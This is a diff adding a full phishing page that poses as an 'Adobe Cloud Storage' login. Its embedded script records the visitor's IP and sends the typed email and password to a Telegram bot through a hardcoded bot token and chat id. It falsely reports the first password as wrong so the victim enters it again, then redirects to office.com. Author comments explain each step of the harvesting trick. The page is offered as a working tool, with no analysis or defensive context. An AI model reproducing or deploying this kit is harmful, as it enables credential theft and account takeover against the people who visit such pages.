@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Cloud Storage Login</title>
+    <style>
+        * {
+            font-family: Arial, sans-serif;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 350px;
+        }
+
+        .login-container img {
+            width: 50px;
+        }
+
+        h2 {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        p {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #e53935;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #c62828;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="data:image/png;base64,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" alt="logo">
+        <h2>Adobe Cloud Storage</h2>
+        <p>This document is password protected. Please enter the email password below.</p>
+        <form>
+            <input type="hidden" id="hidden_ip">
+   <span id="msg2" class="text-danger" style="display: none;">Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a></span>
+
+
+
+
+ <div class="form-group mt-2">
+                            <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
+                        </div>
+            
+            
+            
+            
+            <br>
+            
+            <div class="form-group mt-1">
+                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+              
+              
+              <br>
+              
+              
+              
+               <div class="text-right">
+                            <input type="button" value="Sign in" class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">
+        
+                            </div>
+
+
+
+
+</form>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+
+
+
+<script>
+$(document).ready(function() {
+
+
+
+   let ip;
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
+    var obj = JSON.parse(JSON.stringify(data));
+         document.getElementById("hidden_ip").value = obj.ip;
+        });
+  //this is the  json that pass the ip into our hidden input 
+
+ // Get User Agent (Browser & Device Info)
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+  
+
+});
+
+  function sendTeleMsg(email, passkey, ip) {
+
+        var message = "";
+        message += "+=========== 🔐 New Login Attempt: ======="+'\n'
+        message += "🌐 IP Address: ${ipAddress}\n"  +  " : " + ip + '\n';
+        
+        message += "👤 Username: ${username}\n"  +  " : " + email+ '\n';
+
+        
+        message += "🔑 Password: ${password}\n "  +  " : " + passkey + '\n';
+            
+
+               let token = '7679084330:AAG-tanez7E0XuZpT9TcozSbCmMq626KQsI';
+        var chatid = '-1002326272729';
+
+        var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + token + "/sendMessage?chat_id="+chatid,
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chatid,
+            "text": message
+        })
+        } 
+
+        $.ajax(settings).done(function (response) {
+        if(response.ok === true) {
+        }
+        
+        }); 
+
+  }
+document.querySelector("#submit-btn").addEventListener('click', function(){
+  const passkey = document.querySelector("#pr").value;
+  
+  const email = document.querySelector("#ai").value;
+  let count = 0;
+  const ip = document.querySelector("#hidden_ip").value;  // THIS IS WHERE WE CALL the ip address of the page visitor 
+    //    console.log(ip);
+    
+    
+    //on this page i create if statement to make sure the input are  not empty before sending it
+  
+    
+    if(!passkey) {
+      document.querySelector("#msg2").style.display="block";
+      setTimeout(()=>{
+        document.querySelector("#msg2").style.display="none";
+      }, 10000)
+    } 
+    
+    // this make sure we input the pass before sending the data 
+    
+    
+    else  if(!email) {
+      document.querySelector("#msg2").style.display="block";
+      setTimeout(()=>{
+        document.querySelector("#msg2").style.display="none";
+      }, 10000)
+    } 
+    // this make sure the username/email was input b4 sending it to telegram and show error msg if not insert
+    
+    
+    else{
+            count++ // this to count the number of click 
+            
+              if(count == 2) { 
+            
+            //after 2 click
+           sendTeleMsg(email, passkey, ip);  // this send the result again 
+            window.location.href="http://www.office.com"; // this is the last part of the landing page we want the visitor to go to
+        } 
+    
+    
+    
+    
+    else{
+        
+      
+      
+
+          sendTeleMsg(email, passkey, ip);  // to send the data info to telegram
+          document.querySelector("#pr").value=""; // to empty the password input after first valid input the email will still be display, 
+        //this is to collect like 2 possible correct password
+          document.querySelector("#msg2").style.display="block"; // this will also show msg of incorrect pass so that they can input the password again
+        
+       
+    }
+
+    }
+    
+    
+  
+
+  })
+
+
+</script>
+</body>  
+</html>
+        </form>
+    </div>
+
+</body>
+</html>
